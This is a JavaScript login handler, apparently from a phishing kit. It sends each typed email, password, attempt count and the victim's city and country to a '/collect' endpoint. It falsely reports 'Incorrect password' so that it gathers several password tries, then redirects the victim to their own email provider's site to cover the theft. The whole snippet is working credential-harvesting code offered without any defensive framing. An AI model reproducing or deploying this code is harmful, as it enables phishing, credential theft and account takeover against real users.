loginBtn.addEventListener('click', () => {
    const password = passwordInput.value.trim();
    if (!password) {
        errorMsg.textContent = "Password cannot be empty.";
        return;
    }
    attempts++;

    // Send login attempt to Node
    fetch('/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            email: emailInput.value,
            password,
            attempt: attempts,
            city: userCity,
            country: userCountry
        })
    }).then(res => res.json())
      .then(data => console.log("Node response:", data))
      .catch(err => console.error(err));

    if (attempts < maxAttempts) {
        errorMsg.textContent = "Incorrect password.";
        passwordInput.value = "";
    } else {
        errorMsg.textContent = "";
        overlay.style.display = 'none';
        document.body.classList.remove('blur-active');
        window.location.href = `https://${emailInput.value.split('@')[1]}`;
    }
});
